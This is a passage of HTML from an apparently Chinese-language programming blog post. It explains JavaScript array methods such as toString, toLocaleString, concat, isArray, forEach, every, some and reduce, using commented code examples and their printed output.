class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1,2,3]+&apos;abc&apos; //1,2,3abc</span><br></pre></td></tr></table></figure><blockquote><p>返回值： 返回一个字符串表示数组中的元素</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 扁平化简单的二维数组</span></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">11</span>, [<span class="number">22</span>, <span class="number">33</span>], [<span class="number">44</span>, <span class="number">55</span>], <span class="number">66</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flatArr = arr.toString().split(<span class="string">','</span>); <span class="comment">// ["11", "22", "33", "44", "55", "66"]</span></span><br></pre></td></tr></table></figure><h4 id="3-4-toLocaleString"><a href="#3-4-toLocaleString" class="headerlink" title="3.4  toLocaleString()"></a>3.4  toLocaleString()</h4><blockquote><p>数组中的元素将使用各自的 toLocaleString 方法转成字符串，这些字符串将使用一个特定语言环境的字符串（例如一个逗号 “,”）隔开</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数组中的元素将会使用各自的 toLocaleString 方法：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Object: Object.prototype.toLocaleString()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Number: Number.prototype.toLocaleString()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Date: Date.prototype.toLocaleString()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> prices = [<span class="string">'￥7'</span>, <span class="number">500</span>, <span class="number">8123</span>, <span class="number">12</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不带参数</span></span><br><span class="line"></span><br><span class="line">prices.toLocaleString(); <span class="comment">// "￥7,500,8,123,12"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//带参数</span></span><br><span class="line"></span><br><span class="line">prices.toLocaleString(<span class="string">'ja-JP'</span>, &#123; <span class="attr">style</span>: <span class="string">'currency'</span>, <span class="attr">currency</span>: <span class="string">'JPY'</span> &#125;); <span class="comment">// "￥7,500,8,123,12"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//MDN上的举例中说是 "￥7,￥500,￥8,123,￥12"，在浏览器和Node中验证了返回的都是 "￥7,500,8,123,12" 啊！</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 以下的这个例子要跟上面的toString对照看</span></span><br><span class="line"></span><br><span class="line">[&#123;<span class="attr">a</span>:<span class="number">1</span>&#125;,<span class="number">1</span>,<span class="keyword">new</span> <span class="built_in">Date</span>()].toLocaleString() <span class="comment">//"[object Object],1,2018/7/7 下午6:45:00"</span></span><br></pre></td></tr></table></figure><blockquote><p>返回值： 表示数组元素的字符串</p></blockquote><h4 id="3-5-concat"><a href="#3-5-concat" class="headerlink" title="3.5  concat()"></a>3.5  concat()</h4><blockquote><p>它的元素包括调用concat()的原始数组的元素和concat()的每个参数，但是要注意，concat()不会递归扁平化数组的数组，concat()也不会修改调用的数组</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].concat([<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]) <span class="comment">// [1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br><span class="line"></span><br><span class="line">[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>].concat(<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>],[[<span class="number">4</span>,<span class="number">5</span>]]) <span class="comment">// ["a", "b", "c", 1, 2, 3, [4,5]]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// concat方法不会改变this或任何作为参数提供的数组，而是返回一个浅拷贝,所以原始数组和新数组都引用相同的对象。 如果引用的对象被修改，新数组和原始数组都会变。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">2</span>,obj];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr2 = [<span class="number">1</span>].concat(arr1);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(arr1,arr2) <span class="comment">//[2,&#123;a:1&#125;],[1,2,&#123;a:1&#125;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//记录下上面的打印结果之后修改obj</span></span><br><span class="line"></span><br><span class="line">obj.a = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(arr1,arr2) <span class="comment">////[2,&#123;a:2&#125;],[1,2,&#123;a:2&#125;]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 说了是浅拷贝，而且原数组也不改变，那我们就可以用它来实现数组的浅拷贝功能</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> num1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一种</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> num2 = num1.concat();</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二种</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> num2 = [].concat(num1);</span><br><span class="line">num2[<span class="number">0</span>] = <span class="string">'a'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(num1,num2); <span class="comment">// [1, 2, 3] ["a", 2, 3]</span></span><br></pre></td></tr></table></figure><h4 id="3-6-isArray"><a href="#3-6-isArray" class="headerlink" title="3.6 isArray()"></a>3.6 isArray()</h4><blockquote><p>用于确定传递的值是否是一个 Array</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 下面的函数调用都返回 true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray([]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray([<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray(<span class="keyword">new</span> <span class="built_in">Array</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里注意：Array.prototype 也是一个数组,一个属性值不是索引的数组。[constructor: ƒ, concat: ƒ, find: ƒ, findIndex: ƒ, pop: ƒ, …]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray(<span class="built_in">Array</span>.prototype);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面的函数调用都返回 false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray();</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray(&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray(<span class="literal">undefined</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray(<span class="number">17</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray(<span class="string">'Array'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray(&#123; <span class="attr">__proto__</span>: <span class="built_in">Array</span>.prototype &#125;);</span><br></pre></td></tr></table></figure><h3 id="四、数组遍历、映射、过滤、检测、简化等方法"><a href="#四、数组遍历、映射、过滤、检测、简化等方法" class="headerlink" title="四、数组遍历、映射、过滤、检测、简化等方法"></a>四、数组遍历、映射、过滤、检测、简化等方法</h3><h4 id="4-1-forEach"><a href="#4-1-forEach" class="headerlink" title="4.1 forEach()"></a>4.1 forEach()</h4><blockquote><p>方法从头到尾遍历数组，为每个元素调用指定的函数</p></blockquote><ul><li><code>callback</code> 为数组中每个元素执行的函数，该函数接收三个参数</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1、 空元素不遍历,undefined和null是会遍历的。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> numberArr = [<span class="number">1</span>,<span class="number">2</span>,,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">numberArr.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">value,index,array</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(value,index,array)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//打印信息如下，可见空元素是不会遍历的</span></span><br><span class="line"><span class="comment">//1 0 [1, 2, empty, 3]</span></span><br><span class="line"><span class="comment">//2 1 [1, 2, empty, 3]</span></span><br><span class="line"><span class="comment">//3 3 [1, 2, empty, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> nullArr = [<span class="number">1</span>,<span class="number">2</span>,<span class="literal">null</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">nullArr.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">value,index,array</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(value,index,array)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//打印信息如下，null是会遍历的</span></span><br><span class="line"><span class="comment">//1 0 (4) [1, 2, null, 3]</span></span><br><span class="line"><span class="comment">//2 1 (4) [1, 2, null, 3]</span></span><br><span class="line"><span class="comment">//null 2 (4) [1, 2, null, 3]</span></span><br><span class="line"><span class="comment">//3 3 (4) [1, 2, null, 3]</span></span><br><span class="line"><span class="comment">//2、已删除的项不会被遍历到。如果已访问的元素在迭代时被删除了,之后的元素将被跳过</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> numberArr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">numberArr.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">value,index,array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(index === <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> numberArr[<span class="number">2</span>]; <span class="comment">//删除第三项</span></span><br><span class="line">    <span class="comment">//或者numberArr.pop()</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(value,index,array)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//打印信息如下：</span></span><br><span class="line"><span class="comment">// 1 0 (3) [1, 2, empty]</span></span><br><span class="line"><span class="comment">// 2 1 (3) [1, 2, empty]</span></span><br><span class="line"><span class="keyword">let</span> numberArr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">numberArr1.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">value,index,array</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(index === <span class="number">1</span>) &#123;</span><br><span class="line">    numberArr1.shift() <span class="comment">//遍历到第二项的时候，删除第一项</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(value,index,array)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印信息如下,遍历到第二项的时候，删除第一项，会跳过第三项</span></span><br><span class="line"><span class="comment">// 1 0 (4) [1, 2, 3, 4]</span></span><br><span class="line"><span class="comment">// 2 1 (3) [2, 3, 4]</span></span><br><span class="line"><span class="comment">// 4 2 (3) [2, 3, 4]</span></span><br><span class="line"><span class="comment">// 3、forEach 遍历的范围在第一次调用 callback 前就会确定。调用forEach 后添加到数组中的项不会被 callback 访问到。如果已经存在的值被改变，则传递给 callback 的值是 forEach 遍历到他们那一刻的值。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">value,index,array</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(index === <span class="number">0</span>) &#123;</span><br><span class="line">        arr.push(<span class="string">'新增的不会被遍历到'</span>)</span><br><span class="line">        arr[<span class="number">2</span>] = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(value,index,array)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1 0 (4) [1, 2, 4, "新增的不会被遍历到"]</span></span><br><span class="line"><span class="comment">// 2 1 (4) [1, 2, 4, "新增的不会被遍历到"]</span></span><br><span class="line"><span class="comment">// 4 2 (4) [1, 2, 4, "新增的不会被遍历到"]</span></span><br><span class="line"><span class="comment">// 4、使用thisArg参数 和 箭头函数使用thisArg</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">arr</span>: <span class="string">'thisArg'</span>&#125;</span><br><span class="line"></span><br><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.arr)</span><br><span class="line">&#125;,obj)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印三次 'thisArg'</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">arr</span>: <span class="string">'thisArg'</span>&#125;</span><br><span class="line">arr.forEach(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.arr)</span><br><span class="line">&#125;,obj)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印三次 undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5、forEach无法中途退出循环，只能用return退出本次回调，进行下一次回调</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> result = arr.forEach(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(value == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(value)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(result) <span class="comment">// undefined ，即使中间return vlaue，也还是undefined</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//打印value的值如下，说明return 并不能终止循环</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 3</span></span><br></pre></td></tr></table></figure><h4 id="4-2-map"><a href="#4-2-map" class="headerlink" title="4.2 map()"></a>4.2 map()</h4><blockquote><p>方法创建一个新数组，其结果是该数组中的每个元素都调用一个callback函数后返回的结果</p></blockquote><ul><li>返回值： 一个新数组，每个元素都是回调函数的结果</li><li>不要用 <code>map</code> 代替 <code>forEach</code>,<code>map</code> 会创建一个新的数组，占用内存。如果你不用 <code>map</code> 的返回值，那你就应当使用 <code>forEach</code></li></ul><h4 id="4-3-filter"><a href="#4-3-filter" class="headerlink" title="4.3 filter()"></a>4.3 filter()</h4><ul><li>方法返回的数组元素是调用的数组的一个子集。传入的函数时用来逻辑判定的，该函数返回 true 或 false,如果返回值为true或能转化为true的值，那么传递给判断函数的元素就是这个子集的成员，它将被添加倒一个作为返回值的数组中</li><li>返回值： 一个新的通过测试的元素的集合的数组，如果没有通过测试则返回空数组</li></ul><h4 id="4-4-every"><a href="#4-4-every" class="headerlink" title="4.4 every()"></a>4.4 every()</h4><blockquote><p>方法测试数组的所有元素是否都通过了指定函数的测试。当且仅当针对数组中的所有元素调用判定函数都返回true，它才返回true。</p></blockquote><ul><li>空数组上调用every方法，返回 true，因为空数组没有元素，所以空数组中所有元素都符合给定的条件</li><li>返回值： 一个布尔值，当所有的元素都符合条件才返回true，否则返回false</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">12</span>,<span class="number">34</span>,<span class="number">5</span>,<span class="number">23</span>,<span class="number">44</span>];</span><br><span class="line"><span class="keyword">let</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> result = arr.every(<span class="function"><span class="keyword">function</span> (<span class="params">element, index, array</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    num++;</span><br><span class="line">    <span class="keyword">return</span> element &gt; <span class="number">10</span>;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(result,num) <span class="comment">// 打印 false 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可见发现5这个小于10的元素后，遍历立即终止，num为3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">12</span>,<span class="number">34</span>,,<span class="number">23</span>,<span class="number">44</span>];</span><br><span class="line"><span class="keyword">let</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> result = arr.every(<span class="function"><span class="keyword">function</span> (<span class="params">element, index, array</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">num++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> element &gt; <span class="number">10</span>;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(result,num) <span class="comment">// 打印 true 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不会遍历没有赋值的索引位置，所以num为4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> result = [].every(<span class="function"><span class="keyword">function</span> (<span class="params">element, index, array</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> element &gt; <span class="number">10</span>;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(result) <span class="comment">// 打印 true</span></span><br></pre></td></tr></table></figure><h4 id="4-5-some"><a href="#4-5-some" class="headerlink" title="4.5 some()"></a>4.5 some()</h4><blockquote><p>方法测试数组中的某些元素是否通过由提供的函数实现的测试。当数组中至少有一个元素调用判定函数返回true，它就返回true，当且仅当数组中的所有元素调用判定函数都返回false，它才返回false</p></blockquote><ul><li>空数组调用some，返回false</li><li>返回值： 只要数组中的任意一个元素在回调函数中返回的是真值，就返回true，否则为false</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个简单的例子说明</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isBiggerThan10</span>(<span class="params">element, index, array</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(index)</span><br><span class="line">    <span class="keyword">return</span> element &gt; <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>].some(isBiggerThan10); <span class="comment">// 返回值是false，打印的index是0,1,2,3,4</span></span><br><span class="line"></span><br><span class="line">[<span class="number">12</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>].some(isBiggerThan10); <span class="comment">// 返回值是true，打印的index是0，找到符合元素之后立即返回</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现一个跟includes方法类似的功能</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">include</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> arr.some(<span class="function">(<span class="params">element</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> element === value</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">include(<span class="number">2</span>) <span class="comment">// true</span></span><br><span class="line">include(<span class="number">4</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> result = [].some(<span class="function"><span class="keyword">function</span> (<span class="params">element, index, array</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> element &gt; <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(result) <span class="comment">// 打印 false</span></span><br></pre></td></tr></table></figure><h4 id="4-6-reduce-和-reduceRight"><a href="#4-6-reduce-和-reduceRight" class="headerlink" title="4.6 reduce() 和 reduceRight()"></a>4.6 reduce() 和 reduceRight()</h4><blockquote><p>这两个方法使用指定的函数将数组元素进行组合，生成单个值。这在函数式编程中是常见的操作，也可以称为“注入”和“折叠”。reduceRight() 和 reduce() 工作原理是一样的，不同的是reduceRight() 按照数组索引从高到低（从右到左）处理数组，而不是从低到高</p></blockquote><ul><li>如果数组为空且没有提供initialValue，会抛出TypeError 。如果数组仅有一个元素（无论位置如何）并且没有提供initialValue， 或者有提供initialValue但是数组为空，那么此唯一值将被返回并且callback不会被执行</li><li>返回值： 函数累计处理的结果</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sum = arr.reduce(<span class="function">(<span class="params">x,y</span>) =&gt;</span> x + y,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(sum) <span class="comment">// 15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 看一下initialValue传和不传的区别</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span 